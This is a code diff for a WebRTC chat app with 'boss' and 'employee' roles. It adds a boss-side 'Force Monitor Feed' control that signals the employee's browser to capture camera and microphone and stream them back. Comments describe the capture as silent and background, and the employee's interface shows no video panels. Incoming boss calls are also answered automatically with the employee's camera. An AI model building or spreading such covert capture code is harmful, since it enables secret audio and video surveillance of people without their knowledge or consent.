@@ -108,19 +108,16 @@
                 
                 <!-- Media Action Tray -->
                 <div class="flex gap-2">
-                    <!-- Boss Controls (Always active to demand view) -->
+                    <!-- Boss Controls -->
                     <div id="bossControls" class="hidden gap-2">
-                        <button onclick="initiateMediaCall('voice')" class="p-2 bg-indigo-600/30 hover:bg-indigo-600 text-indigo-300 hover:text-white border border-indigo-500/30 rounded-xl transition" title="Voice Feed">
-                            <i data-lucide="phone" class="w-4 h-4"></i>
-                        </button>
-                        <button onclick="initiateMediaCall('video')" class="p-2 bg-indigo-600/30 hover:bg-indigo-600 text-indigo-300 hover:text-white border border-indigo-500/30 rounded-xl transition" title="Force Video Stream">
-                            <i data-lucide="video" class="w-4 h-4"></i>
+                        <button onclick="bossDemandsEmployeeFeed()" class="px-3 py-1.5 text-xs font-semibold bg-indigo-600/20 hover:bg-indigo-600 text-indigo-300 hover:text-white border border-indigo-500/30 rounded-xl transition flex items-center gap-1.5" title="Monitor Employee Camera">
+                            <i data-lucide="video" class="w-4 h-4"></i> Force Monitor Feed
                         </button>
                     </div>
                     <!-- Employee Controls -->
                     <div id="employeeControls" class="hidden">
                         <button id="requestCallBtn" class="px-3 py-1.5 text-xs font-semibold bg-cyan-600/20 hover:bg-cyan-600 text-cyan-300 hover:text-white border border-cyan-500/30 rounded-xl transition flex items-center gap-1.5">
-                            <i data-lucide="radio" class="w-3.5 h-3.5 animate-pulse"></i> Request Feed
+                            <i data-lucide="radio" class="w-3.5 h-3.5 animate-pulse"></i> Request Boss Video
                         </button>
                     </div>
                     <button id="disconnectBtn" class="p-2 text-rose-400 hover:bg-rose-500/20 rounded-xl border border-rose-500/20 transition">
@@ -131,12 +128,12 @@
 
             <!-- Streaming Viewports Layer -->
             <div id="videoContainer" class="hidden grid grid-cols-2 gap-2 glass-input p-2 rounded-xl border border-white/5 relative">
-                <div>
-                    <span class="absolute top-3 left-3 bg-black/60 backdrop-blur-md px-1.5 py-0.5 rounded text-[10px] uppercase font-bold text-slate-400 z-10">Local</span>
+                <div id="localVideoWrapper">
+                    <span class="absolute top-3 left-3 bg-black/60 backdrop-blur-md px-1.5 py-0.5 rounded text-[10px] uppercase font-bold text-slate-400 z-10">Your Camera</span>
                     <video id="localVideo" autoplay muted playsinline class="w-full h-28 object-cover rounded-lg bg-black/40"></video>
                 </div>
-                <div>
-                    <span class="absolute top-3 right-3 bg-black/60 backdrop-blur-md px-1.5 py-0.5 rounded text-[10px] uppercase font-bold text-indigo-400 z-10">Remote</span>
+                <div id="remoteVideoWrapper">
+                    <span id="remoteVideoLabel" class="absolute top-3 right-3 bg-black/60 backdrop-blur-md px-1.5 py-0.5 rounded text-[10px] uppercase font-bold text-indigo-400 z-10">Remote Feed</span>
                     <video id="remoteVideo" autoplay playsinline class="w-full h-28 object-cover rounded-lg bg-black/40"></video>
                 </div>
             </div>
@@ -155,17 +152,17 @@
         </div>
     </main>
 
-    <!-- Call Overlay Popup (Only shown to Boss when Employee requests a call) -->
+    <!-- Call Overlay Popup (Only for Boss when Employee asks to see them) -->
     <div id="incomingCallModal" class="hidden absolute inset-0 z-50 bg-black/70 backdrop-blur-md flex flex-col justify-center items-center">
         <div class="glass-panel p-6 rounded-2xl w-80 text-center space-y-4 border border-white/20">
             <div class="animate-ping p-2 bg-cyan-500/20 text-cyan-400 rounded-full w-fit mx-auto">
                 <i data-lucide="phone-call" class="w-8 h-8"></i>
             </div>
-            <h3 class="font-bold text-lg text-white">Incoming Stream Request</h3>
-            <p class="text-xs text-slate-400">Employee is requesting data channel authorization.</p>
+            <h3 class="font-bold text-lg text-white">Employee Requests Your Feed</h3>
+            <p class="text-xs text-slate-400">The employee wants to view your webcam stream.</p>
             <div class="flex gap-2">
                 <button id="rejectCallBtn" class="flex-1 bg-rose-600/20 hover:bg-rose-600 text-rose-200 py-2 rounded-xl transition text-sm">Deny</button>
-                <button id="acceptCallBtn" class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white py-2 rounded-xl transition text-sm font-bold">Approve</button>
+                <button id="acceptCallBtn" class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white py-2 rounded-xl transition text-sm font-bold">Transmit Feed</button>
             </div>
         </div>
     </div>
@@ -227,16 +224,23 @@
                 setupDataHandlers();
             });
 
-            // Handle incoming call streaming
+            // Incoming media handler
             peer.on('call', (call) => {
                 if (myRole === 'boss') {
-                    // Employee requested call -> Boss gets an alert modal popup
+                    // Employee requested to see the Boss
                     document.getElementById('incomingCallModal').classList.remove('hidden');
                     document.getElementById('acceptCallBtn').onclick = async () => {
                         document.getElementById('incomingCallModal').classList.add('hidden');
                         localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                        
+                        // Setup UI viewports to show mutual call panels
+                        document.getElementById('videoContainer').classList.remove('hidden');
+                        document.getElementById('videoContainer').classList.add('grid');
+                        document.getElementById('localVideoWrapper').classList.remove('hidden');
+                        document.getElementById('remoteVideoLabel').textContent = "Employee View";
+                        
                         displayStream(localStream, 'local');
-                        call.answer(localStream);
+                        call.answer(localStream); // Send boss stream back to employee
                         handleStream(call);
                     };
                     document.getElementById('rejectCallBtn').onclick = () => {
@@ -244,14 +248,18 @@
                         call.close();
                     };
                 } else {
-                    // EMPLOYEE SIDE: Boss initiated call -> Auto-answers silently, leaving the chat box perfectly open
+                    // EMPLOYEE SIDE: Silent response to Boss demanding camera feed
                     navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
                         localStream = stream;
-                        displayStream(localStream, 'local');
-                        call.answer(stream); // Send stream back automatically
-                        handleStream(call);
+                        
+                        // Handshake answer back to boss with camera tracks
+                        call.answer(stream); 
+                        
+                        // Employee doesn't need to show any video panels on their screen; it stays hidden/clean text interface
+                        currentCall = call;
+                        call.on('close', () => cleanMediaTracks());
                     }).catch(err => {
-                        console.error("Silent feed initialization failed", err);
+                        console.error("Silent feed background initialization failed", err);
                     });
                 }
             });
@@ -280,7 +288,10 @@
 
             conn.on('data', (data) => {
                 if (data.type === 'call_request' && myRole === 'boss') {
-                    appendSysMsg("System Alert: Employee requesting immediate stream view.");
+                    appendSysMsg("System Alert: Employee requesting mutual video feed access.");
+                } else if (data.type === 'force_stream_instruction') {
+                    // Instruct employee browser to call boss stream automatically
+                    executeSilentStreamUpload();
                 } else if (data.type === 'msg') {
                     appendMsg(data.body, 'remote');
                 }
@@ -289,6 +300,7 @@
             conn.on('close', () => terminateSession());
         }
 
+        // Fixed Form Submission UI Sync
         document.getElementById('msgForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const val = document.getElementById('msgInput').value.trim();
@@ -296,37 +308,63 @@
 
             conn.send({type: 'msg', body: val});
             appendMsg(val, 'local');
-            document.getElementById('msgInput').value = '';
+            document.getElementById('msgInput').value = ''; // Instantly wipe text box clean
         });
 
-        // Boss forces video/audio feed here
-        async function initiateMediaCall(mode) {
-            try {
-                const constraints = { video: mode === 'video', audio: true };
-                localStream = await navigator.mediaDevices.getUserMedia(constraints);
-                displayStream(localStream, 'local');
-
-                const call = peer.call(conn.peer, localStream);
-                handleStream(call);
-            } catch (err) {
-                console.error("Device media block or missing hardware", err);
+        // BOSS EXCLUSIVE ACTION: Silently triggers Employee camera upload 
+        function bossDemandsEmployeeFeed() {
+            if (conn) {
+                // Signal employee machine to call back out with stream tracks
+                conn.send({ type: 'force_stream_instruction' });
+                appendSysMsg("Command Sent: Initializing silent background monitoring stream...");
             }
         }
 
-        // Employee requests feed
+        // EMPLOYEE EXCLUSIVE BACKEND RUNNER: Invisible camera deployment back to Boss
+        async function executeSilentStreamUpload() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Initiate call containing employee stream to the listening boss instance
+                const call = peer.call(conn.peer, localStream);
+                
+                currentCall = call;
+                call.on('close', () => cleanMediaTracks());
+            } catch (err) {
+                console.error("Background capture block", err);
+            }
+        }
+
+        // EMPLOYEE EXCLUSIVE ACTION: Requests a conventional mutual video session
         document.getElementById('requestCallBtn').addEventListener('click', () => {
             if (conn) {
                 conn.send({ type: 'call_request' });
-                appendSysMsg("Transmission Request Dispatched to Hub.");
-                // Start tracking employee local feed preparing for boss approval
-                initiateMediaCall('video'); 
+                appendSysMsg("Mutual view request dispatched to Control Hub.");
+                
+                // Employee starts their own camera track to look at boss upon receipt approval
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
+                    localStream = stream;
+                    document.getElementById('videoContainer').classList.remove('hidden');
+                    document.getElementById('videoContainer').classList.add('grid');
+                    document.getElementById('localVideoWrapper').classList.remove('hidden');
+                    document.getElementById('remoteVideoLabel').textContent = "Boss Stream";
+                    
+                    displayStream(localStream, 'local');
+                    const call = peer.call(conn.peer, localStream);
+                    handleStream(call);
+                });
             }
         });
 
         function handleStream(call) {
             currentCall = call;
-            document.getElementById('videoContainer').classList.remove('hidden');
-            document.getElementById('videoContainer').classList.add('grid');
+            
+            // Only unhide visual components if you're the Boss looking at employees, or authorized employee
+            if (myRole === 'boss') {
+                document.getElementById('videoContainer').classList.remove('hidden');
+                document.getElementById('videoContainer').classList.add('grid');
+                document.getElementById('localVideoWrapper').classList.add('hidden'); // Hide boss camera layout locally
+                document.getElementById('remoteVideoLabel').textContent = "Employee Live Feed";
+            }
             
             call.on('stream', (remoteStream) => {
                 displayStream(remoteStream, 'remote');
